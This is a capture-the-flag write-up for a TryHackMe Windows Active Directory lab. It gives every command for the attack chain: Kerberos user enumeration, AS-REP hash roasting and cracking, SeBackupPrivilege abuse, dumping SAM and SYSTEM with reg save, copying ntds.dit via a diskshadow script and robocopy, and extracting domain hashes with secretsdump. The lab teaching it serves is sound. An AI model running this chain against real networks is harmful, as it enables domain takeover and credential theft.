Room: [Fusion Corp](https://tryhackme.com/room/fusioncorp)

Difficulty: Hard

Overview: In this room we will take advantage of different services on a windows machine, abusing Kerberos pre-authentication to enumerate users, dumping and cracking hashes with the help of impacket tools and John the ripper to finaly privesc exploiting SeBackupPrivilege permissions.

------------------------------------------------------------------------------------------------------------------------------------------------------------------

Like always we start our enumeration by running “nmap” to scan for all open ports on the target system:

```
nmap -sV -sC -p- fusioncorp.thm -oN nmap.txt

-sV    →  Probe open ports to determine service
-sC    →  Scan using the default set of scripts
-p-    →  Scan all ports
-oN   →  Save the ouput of the scan in a file
```

![image](https://user-images.githubusercontent.com/76821053/123538370-841da400-d72c-11eb-8508-202b697877da.png)

Normally Active Directory windows machines have alot of open ports, which at times can be scary. But , following the basics.

We will explorer the http webserver: 

![image](https://user-images.githubusercontent.com/76821053/123538375-8d0e7580-d72c-11eb-9d78-b968a9c6653f.png)

Since there was not any usefull information on the website we can search for hidden directories with “gobuster”:
```
gobuster dir --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --url http://fusioncorp.thm -x .txt,.cgi,.php,.log,.bak,.xxx,.old

dir             → Uses directory/file enumeration mode
--wordlist  → Path to wordlist 
--url           → specifies the path of the target url we want to find any hidden directories
-x              → Search for all files with the specified extentions 
```

![image](https://user-images.githubusercontent.com/76821053/123538388-97c90a80-d72c-11eb-8c8c-e19839507a21.png)

We have found an interesting file in the directory /backup which had a list of of employees and their usernames:

![image](https://user-images.githubusercontent.com/76821053/123538395-a0214580-d72c-11eb-85cb-751cb77489c1.png)

Content of "employees.ods":

![image](https://user-images.githubusercontent.com/76821053/123538400-a7e0ea00-d72c-11eb-8a12-437c14f90969.png)

With this information we can create a username wordlist and use “kerbrute" which is a enumeration tool used to brute-force and enumerate valid users by abusing the Kerberos pre-authentication.

![image](https://user-images.githubusercontent.com/76821053/123538409-b202e880-d72c-11eb-8d0f-2b958c9c3e77.png)

```
./kerbrute_linux_amd64 --dc ip_target -d fusion.corp userenum users.txt
```

![image](https://user-images.githubusercontent.com/76821053/123538417-bb8c5080-d72c-11eb-9622-6aff68b9e068.png)

There is a valid username lparker@fusion.corp. Now we will use an "impacket" tool called "GetNPUsers.py" to dump the kerberos hash for all kerberoastable accounts. In this case for the account lparker@fusion.corp.

```
GetNPUsers.py -no-pass -dc -ip ip_target_machine fusion.corp/lparker
```

![image](https://user-images.githubusercontent.com/76821053/123538427-c5ae4f00-d72c-11eb-9d3c-7e7f6e1316c4.png)

We got the hash, since it is encrypted we need to crack it with “John the Ripper”, “hashcat” or another tool of your choice.

![image](https://user-images.githubusercontent.com/76821053/123538511-22aa0500-d72d-11eb-9b01-d331f281be52.png)

Success we have “lparker” credentials, connect with “evil-winrm” and we can start doing some reconnaissance of the machine:

![image](https://user-images.githubusercontent.com/76821053/123538522-3190b780-d72d-11eb-9bf8-658811cb86a1.png)

We found “jmurphy" and “Administrator" accounts. Also the first flag of the room.

![image](https://user-images.githubusercontent.com/76821053/123538529-41a89700-d72d-11eb-82a3-f7b53836a129.png)

Now we are going to query the user jmurphy with “rpcclient” service:

```
rpcclient -U lparker ip_target_machine

queryuser jmurphy
```
![image](https://user-images.githubusercontent.com/76821053/123538536-4d945900-d72d-11eb-85ca-c2f78fd7e0ad.png)

![image](https://user-images.githubusercontent.com/76821053/123538564-7288cc00-d72d-11eb-8c7c-d7754d5203c7.png)

In the description in plaintext we found the password for “jmurphy”.

Lets login again with “evil-winrm” but this time with the new user credentials:

![image](https://user-images.githubusercontent.com/76821053/123538568-816f7e80-d72d-11eb-9ab5-b116e3a13673.png)

Found Second flag:

![image](https://user-images.githubusercontent.com/76821053/123538572-87fdf600-d72d-11eb-8d51-9843ecc766a4.png)

Now to privesc in order to get the last flag we can check /privs for our user:

![image](https://user-images.githubusercontent.com/76821053/123538575-90eec780-d72d-11eb-9f0e-f7452cee0574.png)

We have some privileges that we can exploit and one of them is “SeBackupPrivilege”.

Has we can see the contents of user “Administrator” can be displayed but we cannot read or execute files like the last "flag.txt" file.

![image](https://user-images.githubusercontent.com/76821053/123538589-9fd57a00-d72d-11eb-91f6-3e6032e6b119.png)

This usefull [github](https://github.com/giuliano108/SeBackupPrivilege) repository from "giuliano108" shows us how to take advantage of the SeBackupPrivilege. It allows the user to access directories/files that he doesn't own or doesn't have permission to.

So with “evil-winrm” we can upload the two “.dll” files that we got from the github repository to the target machine:

![image](https://user-images.githubusercontent.com/76821053/123538595-a9f77880-d72d-11eb-9cb5-e5305669b59e.png)

Like in "meterpreter" shell we can do commands “download or upload” to transfer files between the target and the attacker machine.

![image](https://user-images.githubusercontent.com/76821053/123538602-bb408500-d72d-11eb-997c-0b83c4814eb2.png)

Now after importing the two modules we have to user command “Copy-FileSeBackupPrivilege”, this command will make a copy of the “flag.txt” file to our directory abusing “SeBackupPrivilege”:

```
Copy-FileSeBackupPrivilege .\flag.txt C:\Users\jmurphy\flag.txt -Overwrite
```

![image](https://user-images.githubusercontent.com/76821053/123538607-c4c9ed00-d72d-11eb-9d94-6473bd81160f.png)

Now read the last flag!!

![image](https://user-images.githubusercontent.com/76821053/123538616-cf848200-d72d-11eb-9176-b81419df2523.png)

We have all the flags but let's explore and see if we can escalate our privileges further.

My first attempt to privesc to user “Administrator” failed, because i got an invalid “administrator” hash. Let me show:

With user “jmurphy” we can save “sam” and “system” files into a directory that we can access by doing:

```
reg save hklm\sam C:\Users\jmurphy\temp\sam

reg save hklm\system C:\Users\jmurphy\temp\system
```

![image](https://user-images.githubusercontent.com/76821053/123538642-df9c6180-d72d-11eb-90c9-b9ab7574fba8.png)

Now just download the files to your attacker machine:

![image](https://user-images.githubusercontent.com/76821053/123538652-e6c36f80-d72d-11eb-9396-55066e99b93e.png)

With the tool "pypykatz" we can extract the hashes from the "sam" file:

```
pypykatz registry --sam sam system
```

![image](https://user-images.githubusercontent.com/76821053/123538663-ef1baa80-d72d-11eb-8702-dd31c6d969b9.png)

As we can see below we failed login with “Administrator” hash for whatever reason. Maybe because the “sam” file was from the windows machine itself and not the Domain Controller. 

![image](https://user-images.githubusercontent.com/76821053/123538676-f80c7c00-d72d-11eb-8f27-d0ae3095dc17.png)

After reading more on how to privesc this machine through "SeBackupPrivilege" i found a very usefull article in [hackingarticles](https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/) website.

To get all the hashes of the Domain Controller we need “ntds.dit” and “system” files from the target machine.

For getting the “ntds.dit” file we need to use "shadowdisk" functionalities because “ntds.dit” file is always running on the system and doesn't let us make a copy of it.

So we can create a custom “Distributed Shell File" with the commands necessary to make a copy of the Windows drive which then we can extract the “ntds.dit” file:

```
set context persistent nowriters
set metadata c:\Users\jmurphy\temp\metadata.cab
set verbose on
add volume c: alias privesc
create
expose %privesc% x:
```

![image](https://user-images.githubusercontent.com/76821053/123538687-0195e400-d72e-11eb-9da7-e5f83ca81359.png)

Use “unix2dos” to convert the encoding and spacing of the dsh to be windows compatible.

![image](https://user-images.githubusercontent.com/76821053/123538701-0bb7e280-d72e-11eb-9f6a-9ab40c6ac2ed.png)

Running “evil-winrm” with “jmurphy” user i created a /temp folder in his home directory and uploaded the “hashdump.dsh”:

![image](https://user-images.githubusercontent.com/76821053/123538707-14101d80-d72e-11eb-8a36-5c8b5fa4cab1.png)

To ran the commands inside “hashdump.dsh” we will "diskshadow":

```
diskshadow /s hashdump.dsh
```

![image](https://user-images.githubusercontent.com/76821053/123538717-1ecab280-d72e-11eb-9b9f-591f4757dfc9.png)

Now to make the actual copy of the “ntds.dit” we have to use "robocopy" on the new driver letter that we created just now:

```
robocopy /b x:\windows\ntds . ntds.dit
```

![image](https://user-images.githubusercontent.com/76821053/123538734-2a1dde00-d72e-11eb-96c0-951fb6a97d78.png)

To get the “system” file is easier we just need to use:

```
reg save hklm\system C:\Users\jmurphy\temp\system
```

![image](https://user-images.githubusercontent.com/76821053/123538760-3a35bd80-d72e-11eb-862b-433f1e97e7df.png)

We have all the files that we need to get hashes, we just need to download them to our attacker machine:

![image](https://user-images.githubusercontent.com/76821053/123538773-43bf2580-d72e-11eb-83e1-0cd890f010fe.png)

![image](https://user-images.githubusercontent.com/76821053/123538776-4752ac80-d72e-11eb-8e62-1c9510a224c5.png)

![image](https://user-images.githubusercontent.com/76821053/123538779-4ae63380-d72e-11eb-9275-987c54fd23f8.png)

On our attacker machine we can use “impacket  secretsdump” tool to extract all the hashes inside "ntds.dit":

```
impacket-secretsdump -ntds ntds.dit -system system local
```

![image](https://user-images.githubusercontent.com/76821053/123538892-d233a700-d72e-11eb-98ca-0272c861099e.png)

We have a valid “Administrator” hash to use with “evil-winrm”:

![image](https://user-images.githubusercontent.com/76821053/123538919-f68f8380-d72e-11eb-8b48-d206166f8437.png)

Success!

























